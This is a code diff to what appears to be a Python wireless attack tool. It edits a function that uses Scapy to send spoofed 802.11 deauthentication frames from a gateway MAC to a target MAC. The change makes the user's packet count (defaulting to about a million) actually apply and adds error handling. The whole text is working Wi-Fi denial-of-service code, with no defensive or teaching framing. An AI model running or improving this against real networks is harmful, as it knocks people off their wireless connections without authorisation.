@@ -25,15 +25,18 @@ def  DeauthenticationAttacksMainF():
             ifc=input("\nEnter the interface (Must be in monitoring mode) : ")
             while 1:
                 try :
-                    count=int(input("\nEnter the number of packages (default = infinite) : "))
+                    count=input("\nEnter the number of packets (default = infinite) : ")
+                    if not count.strip():
+                        count=1000000
+                        break
+                    count=int(count)
                     break
                 except ValueError:
                     print(f"{color.RED}\n\n ValueError! \n\n")
-
-            if not count:
-                count=100000
             dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
             packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-            sendp(packet, inter=0.1, count=100000, iface=ifc, verbose=1)
+            sendp(packet, inter=0.1, count=count, iface=ifc, verbose=1)
         except KeyboardInterrupt:
             break
+        except Exception as e:
+            input(f"[ ! ] {e}\n\nEnter to continue : ")
